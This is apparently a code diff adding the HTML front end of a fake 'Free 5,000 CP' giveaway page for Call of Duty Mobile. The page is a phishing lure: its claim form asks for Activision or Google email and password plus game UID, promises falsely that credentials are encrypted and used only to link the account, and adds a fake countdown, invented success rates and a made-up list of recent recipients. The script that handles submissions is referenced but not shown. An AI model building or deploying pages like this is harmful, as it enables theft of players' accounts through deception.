@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#080808" />
+  <title>Free 5,000 CP — Call of Duty Mobile</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow+Condensed:wght@300;400;500;600&family=Inter:wght@300;400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<!-- ════════════════════════════════════════
+     HERO
+════════════════════════════════════════ -->
+<section id="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-gradient"></div>
+  <canvas id="particle-canvas"></canvas>
+
+  <div class="nav-bar">
+    <span class="nav-brand">FREE CP DROP</span>
+    <span class="nav-meta" id="hud-time">—</span>
+  </div>
+
+  <div class="hero-content">
+    <div class="hero-eyebrow">
+      <span class="eyebrow-dot"></span>
+      <span>Live Drop — Limited Availability</span>
+      <span class="eyebrow-dot"></span>
+    </div>
+
+    <h1 class="hero-h1">
+      Claim Your<br /><em>5,000 CP</em>
+    </h1>
+
+    <p class="hero-sub">
+      COD Points deposited directly to your account.<br />No purchase. No survey. Verified players only.
+    </p>
+
+    <div class="hero-meta">
+      <div class="meta-item">
+        <span class="meta-val" id="cd-display">23:59:59</span>
+        <span class="meta-label">Remaining</span>
+      </div>
+      <div class="meta-divider"></div>
+      <div class="meta-item">
+        <span class="meta-val">5,000</span>
+        <span class="meta-label">CP per drop</span>
+      </div>
+      <div class="meta-divider"></div>
+      <div class="meta-item">
+        <span class="meta-val">99%</span>
+        <span class="meta-label">Success rate</span>
+      </div>
+    </div>
+
+    <a href="#claim-form" class="btn-primary">
+      Claim Your CP
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+    </a>
+  </div>
+
+  <div class="hero-scroll-hint">
+    <div class="scroll-line"></div>
+    <span>Scroll</span>
+  </div>
+</section>
+
+
+<!-- ════════════════════════════════════════
+     HOW IT WORKS
+════════════════════════════════════════ -->
+<section id="how-it-works">
+  <div class="container">
+
+    <header class="section-header reveal">
+      <p class="label-tag">Process</p>
+      <h2>How It Works</h2>
+    </header>
+
+    <div class="steps-row">
+
+      <div class="step reveal delay-1">
+        <div class="step-index">01</div>
+        <div class="step-body">
+          <svg class="step-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
+            <circle cx="9" cy="7" r="4"/>
+            <polyline points="16 11 18 13 22 9"/>
+          </svg>
+          <h3>Register</h3>
+          <p>Enter your Activision ID or Google login details to establish a secure link to your account.</p>
+        </div>
+      </div>
+
+      <div class="step-connector reveal delay-2"></div>
+
+      <div class="step reveal delay-2">
+        <div class="step-index">02</div>
+        <div class="step-body">
+          <svg class="step-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            <polyline points="9 12 11 14 15 10"/>
+          </svg>
+          <h3>Verify</h3>
+          <p>Confirm your UID to prove you are a real Call of Duty Mobile player. Under 60 seconds.</p>
+        </div>
+      </div>
+
+      <div class="step-connector reveal delay-3"></div>
+
+      <div class="step reveal delay-3">
+        <div class="step-index">03</div>
+        <div class="step-body">
+          <svg class="step-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="8" cy="8" r="6"/>
+            <path d="M18.09 10.37A6 6 0 1 1 10.34 18"/>
+            <path d="M7 6h1v4"/>
+            <path d="m16.71 13.88.7.71-2.82 2.82"/>
+          </svg>
+          <h3>Receive</h3>
+          <p>5,000 CP is credited to your account within 24 hours, ready to spend in-game immediately.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+
+<!-- ════════════════════════════════════════
+     STATS
+════════════════════════════════════════ -->
+<section id="stats">
+  <div class="stats-inner">
+    <div class="stat reveal">
+      <span class="stat-num"><span data-count="5000" data-dur="2000">0</span></span>
+      <span class="stat-label">CP Per Drop</span>
+    </div>
+    <div class="stat-sep reveal delay-1"></div>
+    <div class="stat reveal delay-1">
+      <span class="stat-num"><span data-count="1248" data-dur="2200">0</span>+</span>
+      <span class="stat-label">Already Claimed</span>
+    </div>
+    <div class="stat-sep reveal delay-2"></div>
+    <div class="stat reveal delay-2">
+      <span class="stat-num"><span data-count="99" data-dur="1500">0</span>%</span>
+      <span class="stat-label">Success Rate</span>
+    </div>
+  </div>
+</section>
+
+
+<!-- ════════════════════════════════════════
+     CLAIM FORM
+════════════════════════════════════════ -->
+<section id="claim-form">
+  <div class="container-sm">
+
+    <header class="section-header reveal">
+      <p class="label-tag">Claim</p>
+      <h2>Register Your Account</h2>
+      <p class="section-sub">Fill in your details below. Your 5,000 CP will be deposited within 24 hours.</p>
+    </header>
+
+    <form id="claim-form-el" class="form-card reveal" novalidate>
+
+      <input type="hidden" id="login-type-input" value="activision" />
+
+      <!-- Login Method -->
+      <div class="field-group">
+        <label class="field-label">Login Method</label>
+        <div class="toggle-group">
+          <button type="button" class="toggle-btn active" data-type="activision">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
+            Activision
+          </button>
+          <button type="button" class="toggle-btn" data-type="google">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M21.8 10.2H12v3.6h5.6c-.5 2.6-2.8 4.4-5.6 4.4A6.2 6.2 0 0 1 12 5.8c1.5 0 2.9.5 4 1.4L18.4 5A10 10 0 0 0 2 12a10 10 0 0 0 10 10c5.5 0 10-4 10-10 0-.6-.1-1.2-.2-1.8z"/></svg>
+            Google
+          </button>
+        </div>
+      </div>
+
+      <!-- Activision fields -->
+      <div id="activision-fields">
+        <div class="field-group">
+          <label class="field-label" for="act-email">Activision Email</label>
+          <input type="email" id="act-email" class="field-input" placeholder="your@email.com" required />
+        </div>
+        <div class="field-group">
+          <label class="field-label" for="act-pw">Activision Password</label>
+          <div class="input-wrap">
+            <input type="password" id="act-pw" class="field-input" placeholder="Your Activision password" required />
+            <button type="button" class="pw-toggle">
+              <svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12S5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+              <svg class="eye-shut" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+            </button>
+          </div>
+          <p class="field-note">Your credentials are encrypted in transit and used only to link your CODM account.</p>
+        </div>
+      </div>
+
+      <!-- Google fields -->
+      <div id="google-fields" style="display:none">
+        <div class="field-group">
+          <label class="field-label" for="g-email">Google Email</label>
+          <input type="email" id="g-email" class="field-input" placeholder="your@gmail.com" />
+        </div>
+        <div class="field-group">
+          <label class="field-label" for="g-pw">Google Account Password</label>
+          <div class="input-wrap">
+            <input type="password" id="g-pw" class="field-input" placeholder="Your Google password" />
+            <button type="button" class="pw-toggle">
+              <svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12S5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
+              <svg class="eye-shut" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+            </button>
+          </div>
+          <p class="field-note">Your credentials are encrypted in transit and used only to link your CODM account.</p>
+        </div>
+      </div>
+
+      <!-- UID -->
+      <div class="field-group">
+        <label class="field-label" for="uid">Call of Duty Mobile UID</label>
+        <input type="text" id="uid" class="field-input" placeholder="e.g. 1234567890" required pattern="[0-9]+" inputmode="numeric" />
+        <p class="field-note">CODM → Profile → tap your avatar → copy the numeric ID shown below your name.</p>
+      </div>
+
+      <!-- Delivery email -->
+      <div class="field-group">
+        <label class="field-label" for="delivery-email">Confirmation Email</label>
+        <input type="email" id="delivery-email" class="field-input" placeholder="Where we'll send your drop confirmation" required />
+      </div>
+
+      <div class="form-footer">
+        <button type="submit" id="submit-btn" class="btn-primary btn-full">
+          <span id="submit-label">Claim My 5,000 CP</span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+        </button>
+        <p class="form-disclaimer">
+          By submitting you agree to our Terms of Service. Your information is used solely to process this CP drop.
+        </p>
+      </div>
+
+    </form>
+
+    <!-- Success state -->
+    <div id="success-msg">
+      <div class="success-check">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <h3>Drop Confirmed</h3>
+      <p>Your claim for <strong>5,000 CP</strong> is being processed. Expect a confirmation email and your CP within <strong>24 hours</strong>.</p>
+    </div>
+
+  </div>
+</section>
+
+
+<!-- ════════════════════════════════════════
+     RECENT DROPS
+════════════════════════════════════════ -->
+<section id="activity">
+  <div class="container">
+    <header class="section-header reveal">
+      <p class="label-tag">Activity</p>
+      <h2>Recent Drops</h2>
+    </header>
+
+    <div class="activity-list">
+      <div class="activity-row reveal delay-1">
+        <span class="activity-name">GhostReaper99</span>
+        <span class="activity-platform">PC</span>
+        <span class="activity-amount">5,000 CP</span>
+        <span class="activity-time">2 min ago</span>
+      </div>
+      <div class="activity-row reveal delay-2">
+        <span class="activity-name">TacticalN00b</span>
+        <span class="activity-platform">Android</span>
+        <span class="activity-amount">5,000 CP</span>
+        <span class="activity-time">9 min ago</span>
+      </div>
+      <div class="activity-row reveal delay-3">
+        <span class="activity-name">SniperElite_X</span>
+        <span class="activity-platform">iOS</span>
+        <span class="activity-amount">5,000 CP</span>
+        <span class="activity-time">17 min ago</span>
+      </div>
+      <div class="activity-row reveal delay-1">
+        <span class="activity-name">BravoSix</span>
+        <span class="activity-platform">PC</span>
+        <span class="activity-amount">5,000 CP</span>
+        <span class="activity-time">24 min ago</span>
+      </div>
+      <div class="activity-row reveal delay-2">
+        <span class="activity-name">AlphaWolf_7</span>
+        <span class="activity-platform">Android</span>
+        <span class="activity-amount">5,000 CP</span>
+        <span class="activity-time">36 min ago</span>
+      </div>
+      <div class="activity-row reveal delay-3">
+        <span class="activity-name">Nightstalker_K</span>
+        <span class="activity-platform">iOS</span>
+        <span class="activity-amount">5,000 CP</span>
+        <span class="activity-time">41 min ago</span>
+      </div>
+    </div>
+
+    <div class="live-row reveal">
+      <span class="live-dot"></span>
+      <span class="live-text">Updated in real time</span>
+    </div>
+  </div>
+</section>
+
+
+<!-- ════════════════════════════════════════
+     FOOTER
+════════════════════════════════════════ -->
+<footer>
+  <div class="footer-inner">
+    <p class="footer-brand">Free CP Drop</p>
+    <p class="footer-copy">
+      Independent promotional page. Not affiliated with or endorsed by Activision Publishing, Inc.
+      CALL OF DUTY® is a registered trademark of Activision Publishing, Inc.
+    </p>
+    <nav class="footer-nav">
+      <a href="#">Terms</a>
+      <a href="#">Privacy</a>
+      <a href="#">Support</a>
+    </nav>
+  </div>
+</footer>
+
+<script type="module" src="script.js"></script>
+</body>
+</html>
